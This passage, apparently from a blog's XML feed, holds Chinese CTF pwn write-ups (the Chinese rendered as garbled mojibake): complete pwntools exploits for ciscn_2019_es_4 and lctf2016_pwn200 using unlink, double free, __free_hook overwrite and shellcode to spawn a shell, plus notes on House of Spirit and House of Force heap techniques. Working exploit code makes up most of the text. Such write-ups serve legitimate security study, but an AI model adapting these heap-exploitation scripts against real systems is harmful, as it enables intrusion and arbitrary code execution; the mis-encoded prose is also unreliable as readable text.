class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_es_4&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29483</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;size:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;gift: &quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">7</span>),<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">&quot;content:\n&quot;</span>)<br>p.send(content)<br><span class="hljs-keyword">return</span> addr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;content:\n&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>ptr = <span class="hljs-number">0x602118</span><br>key = <span class="hljs-number">0x00000000006022B8</span><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add(i,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;\x07&#x27;</span> * <span class="hljs-number">0xf0</span>)<br>heap_addr = add(<span class="hljs-number">7</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>log,success(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&quot;b&quot;</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;c&quot;</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">7</span>):<br>free(i)<br><span class="hljs-comment">#unlink</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) <br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>)<br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>)<br>edit(<span class="hljs-number">7</span>,fake_chunk)<br>free(<span class="hljs-number">8</span>)<br><br>payload = p64(heap_addr + <span class="hljs-number">0x190</span>) * <span class="hljs-number">2</span> + p64(free_got) + p64(ptr - <span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">7</span>,payload)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>) <span class="hljs-comment">#double free</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,p64(key))<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x80</span>,p32(<span class="hljs-number">5</span>) + p32(<span class="hljs-number">5</span>))<br>show(<span class="hljs-number">6</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = p64(free_hook) * <span class="hljs-number">3</span> + p64(ptr - <span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">7</span>,payload)<br>edit(<span class="hljs-number">5</span>,p64(system))<br>free(<span class="hljs-number">10</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="äºŒåã€lctf2016-pwn200"><a href="#äºŒåã€lctf2016-pwn200" class="headerlink" title="äºŒåã€lctf2016_pwn200"></a>äºŒåã€lctf2016_pwn200</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105020439.png" alt="image-20210905105020439"></p><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œä¿æŠ¤å‡ ä¹éƒ½æ²¡å¼€å¯</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105059956.png" alt="image-20210905105059956"></p><p>è¿›å…¥IDAï¼Œè¿›å…¥çš„ç¬¬ä¸€ä¸ªå‡½æ•°å°±å­˜åœ¨é—®é¢˜ï¼Œè¿™è¾¹æœ€é•¿è¾“å…¥0x30çš„å­—ç¬¦ï¼Œä½†æ˜¯v2è·ç¦»rbpçš„è·ç¦»ä¹Ÿæ˜¯0x30ï¼Œæ‰€ä»¥å¯ä»¥å€Ÿæ­¤æ‰“å°å‡ºrbpçš„å€¼ï¼Œå¾—åˆ°æ ˆä¸Šåœ°å€ï¼Œé‚£ä¹ˆåº”è¯¥å°±æ˜¯ret2shellcodeäº†</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105342837.png" alt="image-20210905105342837"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105242460.png" alt="image-20210905105242460"></p><p>å†å¾€ä¸‹çœ‹ï¼Œè¿™è¾¹å­˜åœ¨ä»»æ„åœ°å€å†™</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905110435529.png" alt="image-20210905110435529"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905110553881.png" alt="image-20210905110553881"></p><p>è®¡ç®—ä¸€ä¸‹åç§»</p><p>ç„¶åé€šè¿‡ä»»æ„åœ°å€å†™å¾€free@gotè¡¨é‡Œå†™å…¥å‰é¢ç®—å¥½çš„shellcodeçš„åœ°å€ï¼Œå†æ‰§è¡Œåˆ°åé¢ç¨‹åºä¸­çš„freeå‡½æ•°ï¼Œç„¶åè·³è½¬åˆ°å†™å¥½çš„shellcodeæ‰§è¡Œ</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905112409521.png" alt="image-20210905112409521"></p><p>getshellï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25517</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn200&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn200&#x27;</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p,&#x27;b *main&#x27;)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;who are u?\n&quot;</span>)<br>shellcode = asm(shellcraft.sh())<br>p.send(shellcode.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>))<br>leak_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">80</span><br>log.info(<span class="hljs-built_in">hex</span>(leak_addr))<br>p.recvuntil(<span class="hljs-string">&quot;give me your id ~~?&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;give me money~\n&quot;</span>)<br>payload = p64(leak_addr) + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span> + p64(free_got)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;choice :&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ä¸€ã€xdctf2015-pwn200&quot;&gt;&lt;a href=&quot;#ä¸€ã€xdctf2015-pwn200&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ã€xdctf2015_pwn200&quot;&gt;&lt;/a&gt;ä¸€ã€xdctf2015_pwn200&lt;/h2&gt;&lt;p&gt;&lt;img s</summary>
      
    
    
    
    
    <category term="buu" scheme="http://example.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>house ofç³»åˆ—</title>
    <link href="http://example.com/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/"/>
    <id>http://example.com/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/</id>
    <published>2021-07-27T06:13:59.000Z</published>
    <updated>2021-10-13T08:01:21.579Z</updated>
    
    <content type="html"><![CDATA[<p> è¯¥ç³»åˆ—å†…å®¹è¾ƒå¤šï¼Œå°†ä¼šåœ¨è¾ƒé•¿æ—¶é—´æŒç»­æ›´æ–°</p><h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h2><p>çˆ†ç ´æ¦‚ç‡å¤ªä½ï¼Œä¸å»ºè®®å†ç”¨ï¼Œäº†è§£ä¸€ä¸‹åˆ©ç”¨æ€è·¯å³å¯</p><h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><p>åˆ©ç”¨æ¡ä»¶</p><ul><li>ä¿®æ”¹åçš„Top chunk size &gt; MINSIZE ï¼ˆ0x10ï¼‰</li><li>Top chunk inuse == 1</li><li>ä¿®æ”¹åçš„Top chunk size å¿…é¡»å¯¹é½åˆ°å†…å­˜é¡µ</li><li>æœ€åä¸‹ä¸€æ¬¡åˆ†é…çš„chunkå¤§äºTop chunk size - 0x10</li></ul><h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>æŠ€æœ¯æ¥æºï¼š<a href="https://www.anquanke.com/post/id/85357">https://www.anquanke.com/post/id/85357</a></p><p>House of Spiritï¼ˆä¸‹é¢ç§°ä¸ºhosï¼‰ç®—æ˜¯ä¸€ä¸ªç»„åˆå‹æ¼æ´çš„åˆ©ç”¨ï¼Œæ˜¯å˜é‡è¦†ç›–å’Œå †ç®¡ç†æœºåˆ¶çš„ç»„åˆåˆ©ç”¨ï¼Œå…³é”®åœ¨äºèƒ½å¤Ÿè¦†ç›–ä¸€ä¸ªå †æŒ‡é’ˆå˜é‡ï¼Œä½¿å…¶æŒ‡å‘å¯æ§çš„åŒºåŸŸï¼Œåªè¦æ„é€ å¥½æ•°æ®ï¼Œé‡Šæ”¾åç³»ç»Ÿä¼šé”™è¯¯çš„å°†è¯¥åŒºåŸŸä½œä¸ºå †å—æ”¾åˆ°ç›¸åº”çš„fast biné‡Œé¢ï¼Œæœ€åå†åˆ†é…å‡ºæ¥çš„æ—¶å€™ï¼Œå°±æœ‰å¯èƒ½æ”¹å†™æˆ‘ä»¬ç›®æ ‡åŒºåŸŸã€‚</p><h3 id="ä½¿ç”¨æ¡ä»¶"><a href="#ä½¿ç”¨æ¡ä»¶" class="headerlink" title="ä½¿ç”¨æ¡ä»¶"></a>ä½¿ç”¨æ¡ä»¶</h3><p>ï¼ˆ1ï¼‰æƒ³è¦æ§åˆ¶çš„ç›®æ ‡åŒºåŸŸçš„å‰æ®µç©ºé—´ä¸åæ®µç©ºé—´éƒ½æ˜¯å¯æ§çš„å†…å­˜åŒºåŸŸ</p><p>ä¸€èˆ¬æ¥è¯´æƒ³è¦æ§åˆ¶çš„ç›®æ ‡åŒºåŸŸå¤šä¸ºè¿”å›åœ°å€æˆ–æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œè¯¥å†…å­˜åŒºåŸŸæˆ‘ä»¬è¾“å…¥çš„æ•°æ®æ˜¯æ— æ³•æ§åˆ¶çš„ï¼Œæƒ³è¦åˆ©ç”¨hosæ”»å‡»æŠ€æœ¯æ¥æ”¹å†™è¯¥åŒºåŸŸï¼Œé¦–å…ˆéœ€è¦æˆ‘ä»¬å¯ä»¥æ§åˆ¶é‚£ç‰‡ç›®æ ‡åŒºåŸŸçš„å‰é¢ç©ºé—´å’Œåé¢ç©ºé—´ï¼Œç¤ºæ„å›¾å¦‚ä¸‹</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/t01ab6f5c485fc67d66.png" alt="http://p7.qhimg.com/t01c4e1f8669a8b77bd.png"></p><p>ï¼ˆ2ï¼‰å­˜åœ¨å¯å°†å †å˜é‡æŒ‡é’ˆè¦†ç›–ä¸ºæŒ‡å‘å¯æ§åŒºåŸŸï¼Œå³ä¸Šä¸€æ­¥ä¸­çš„åŒºåŸŸ</p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>ï¼ˆ1ï¼‰ä¼ªé€ å †å—ï¼Œåœ¨å¯æ§1åŠå¯æ§2ï¼ˆå¯æ§2çš„ä¼ªé€ sizeä¸èƒ½å°äº2*SIZE_SZä¸”ä¸èƒ½å¤§äºå·²åˆ†é…å†…å­˜ï¼‰æ„é€ å¥½æ•°æ®ï¼Œå°†å®ƒä¼ªé€ æˆä¸€ä¸ªfast chunkã€‚</p><p>ï¼ˆ2ï¼‰è¦†ç›–å †æŒ‡é’ˆæŒ‡å‘ä¸Šä¸€æ­¥ä¼ªé€ çš„å †å—ã€‚</p><p>ï¼ˆ3ï¼‰é‡Šæ”¾å †å—ï¼Œå°†ä¼ªé€ çš„å †å—é‡Šæ”¾å…¥fast biné‡Œé¢ã€‚</p><p>ï¼ˆ4ï¼‰ç”³è¯·å †å—ï¼Œå°†åˆšåˆšé‡Šæ”¾çš„å †å—ç”³è¯·å‡ºæ¥ï¼Œæœ€ç»ˆä½¿å¾—å¯ä»¥å¾€ç›®æ ‡åŒºåŸŸä¸­å†™å…¥æ•°æ®ï¼Œå®ç°ç›®çš„ã€‚</p><p>ç¬¬ä¸€æ­¥ä¸­çš„ä¼ªé€ å †å—çš„è¿‡ç¨‹ï¼Œfastbinæ˜¯ä¸€ä¸ªå•é“¾è¡¨ç»“æ„ï¼Œéµå¾ªFIFOçš„è§„åˆ™ï¼Œ32ä½ç³»ç»Ÿä¸­fastbinçš„å¤§å°æ˜¯åœ¨16<del>64å­—èŠ‚ä¹‹é—´ï¼Œ64ä½æ˜¯åœ¨32</del>128å­—èŠ‚ä¹‹é—´ã€‚é‡Šæ”¾æ—¶ä¼šè¿›è¡Œä¸€äº›æ£€æŸ¥ï¼Œæ‰€ä»¥éœ€è¦å¯¹ä¼ªå †å—ä¸­çš„æ•°æ®è¿›è¡Œæ„é€ ï¼Œä½¿å…¶é¡ºåˆ©çš„é‡Šæ”¾è¿›åˆ°fastbiné‡Œé¢</p><h3 id="ä¾‹é¢˜BUU-lctf2016pwn200"><a href="#ä¾‹é¢˜BUU-lctf2016pwn200" class="headerlink" title="ä¾‹é¢˜BUU-lctf2016pwn200"></a>ä¾‹é¢˜BUU-lctf2016pwn200</h3><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204052044.png" alt="image-20210905204052044"></p><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œä¿æŠ¤åŸºæœ¬æ²¡å¼€ã€‚</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204120841.png" alt="image-20210905204120841"></p><p>è¿™é‡Œçš„è¾“å…¥å­˜åœ¨æ¼æ´ï¼Œå¡«æ»¡å¯ä»¥æ³„éœ²å‡ºrspä¸Šçš„å€¼ï¼Œè·å¾—æ ˆä¸Šåœ°å€</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/t014c47eb8e813cbe79.png" alt="http://p8.qhimg.com/t01eb7870c8fa4fde39.png"></p><p>ç›®æ ‡åœ°å€çš„æ„é€ ä¸ºä¸Šå›¾æ‰€ç¤ºï¼Œåœ¨moneyä¸­è¾“å…¥çš„æ˜¯ä¼ªå †å—çš„sizeï¼Œåœ¨idé‡Œè¾“å…¥çš„æ˜¯ä¸‹ä¸€ä¸ªå †å—çš„sizeï¼Œä»¥æ­¤ç»•è¿‡freeé‡Šæ”¾å †å—æ—¶å€™ç³»ç»Ÿçš„æ£€æŸ¥</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204549591.png" alt="image-20210905204549591"></p><p>ç„¶åå°±æ˜¯ï¼š</p><p>ï¼ˆ1ï¼‰è¦†ç›–å †æŒ‡é’ˆï¼Œåœ¨è¾“å…¥moneyçš„æ—¶å€™ï¼Œä¼šè¦†ç›–å †å—ã€‚</p><p>ï¼ˆ2ï¼‰è°ƒç”¨freeå‡½æ•°å°†ä¼ªå †å—é‡Šæ”¾åˆ°fastbinä¸­</p><p>ï¼ˆ3ï¼‰ç”³è¯·å †å—ï¼Œå°†åˆšåˆšçš„ä¼ªå †å—ç”³è¯·å‡ºæ¥</p><p>ï¼ˆ4ï¼‰è¾“å…¥æ•°æ®ï¼Œå³å¯ä¿®æ”¹ç›®æ ‡åŒºåŸŸï¼Œeipï¼Œä½¿å…¶æŒ‡å‘shellcode</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905230703667.png" alt="image-20210905230703667"></p><p>è¿™æ˜¯æ„é€ å‡ºæ¥çš„fake_chunkï¼Œåé¢å°±æ˜¯è¦æŠŠè¿™å—é‡Šæ”¾äº†ï¼Œç„¶åå†ç”³è¯·å›æ¥ï¼ŒæŠŠ0x400b34è¿™ä¸ªåœ°å€è¦†ç›–ä¸ºshellcodeï¼Œå³å¯åœ¨é€€å‡ºç¨‹åºæ—¶è¿”å›åˆ°shellcodeå»æ‰§è¡Œ</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905212358111.png" alt="image-20210905212358111"></p><p>getshellï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,26770)</span><br>p = process(<span class="hljs-string">&#x27;./pwn200&#x27;</span>)<br><br>free_got = <span class="hljs-number">0x0000000000602018</span><br><br>shellcode = asm(shellcraft.amd64.linux.sh(), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#part one</span><br>payload  = <span class="hljs-string">&#x27;&#x27;</span><br>payload += shellcode.ljust(<span class="hljs-number">48</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;who are u?\n&#x27;</span>)<br>p.send(payload)<br>p.recvuntil(payload)<br><br>rbp_addr = u64(p.recvn(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br>shellcode_addr = rbp_addr - <span class="hljs-number">0x50</span> <span class="hljs-comment"># 20H + 30H</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;shellcode_addr: &quot;</span>, <span class="hljs-built_in">hex</span>(shellcode_addr)<br>fake_addr = rbp_addr - <span class="hljs-number">0x90</span> <span class="hljs-comment"># offset 0x40 to shellcode, 0x400a29 return address</span><br><br><br>p.recvuntil(<span class="hljs-string">&#x27;give me your id ~~?\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;33&#x27;</span>) <span class="hljs-comment"># id</span><br>p.recvuntil(<span class="hljs-string">&#x27;give me money~\n&#x27;</span>)<br><br><span class="hljs-comment">#part two</span><br><span class="hljs-comment">#32bytes padding + prev_size + size + padding + fake_addr</span><br>data = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>)      <span class="hljs-comment"># no strcpy</span><br>data = data.ljust(<span class="hljs-number">0x38</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(fake_addr)<br><span class="hljs-built_in">print</span> data<br>p.send(data)<br><br>p.recvuntil(<span class="hljs-string">&#x27;choice : &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)     <span class="hljs-comment"># free(fake_addr)</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;choice : &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)     <span class="hljs-comment">#malloc(fake_addr) #fake_addr</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;long?&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;48&#x27;</span>)<br>p.recvline(<span class="hljs-string">&#x27;48&#x27;</span>)  <br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(shellcode_addr) <span class="hljs-comment"># write to target_addr</span><br><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;choice&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h2><p>æ¥æºï¼šctf.wiki</p><p>House Of Force äº§ç”Ÿçš„åŸå› åœ¨äº glibc å¯¹ top chunk çš„å¤„ç†ï¼Œè¿›è¡Œå †åˆ†é…æ—¶ï¼Œå¦‚æœæ‰€æœ‰ç©ºé—²çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œé‚£ä¹ˆå°±ä¼šä» top chunk ä¸­åˆ†å‰²å‡ºç›¸åº”çš„å¤§å°ä½œä¸ºå †å—çš„ç©ºé—´ã€‚</p><p>é‚£ä¹ˆï¼Œå½“ä½¿ç”¨ top chunk åˆ†é…å †å—çš„ size å€¼æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ä»»æ„å€¼æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿç­”æ¡ˆæ˜¯ï¼Œå¯ä»¥ä½¿å¾— top chunkæŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„ä»»ä½•ä½ç½®ï¼Œè¿™å°±ç›¸å½“äºä¸€æ¬¡ä»»æ„åœ°å€å†™ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å°</span><br>victim = av-&gt;top;<br>size   = chunksize(victim);<br><span class="hljs-comment">// å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)) <br>&#123;<br>    remainder_size = size - nb;<br>    remainder      = chunk_at_offset(victim, nb);<br>    av-&gt;top        = remainder;<br>    set_head(victim, nb | PREV_INUSE |<br>            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head(remainder, remainder_size | PREV_INUSE);<br><br>    check_malloced_chunk(av, victim, nb);<br>    <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>    alloc_perturb(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯top chunkåœ¨åˆ†é…å †å—æ—¶ä¼šæ‰§è¡Œçš„æ“ä½œçš„æºç ï¼Œä¼šå¯¹ç”¨æˆ·è¯·æ±‚çš„sizeå’Œ top chunk ç°æœ‰çš„ size 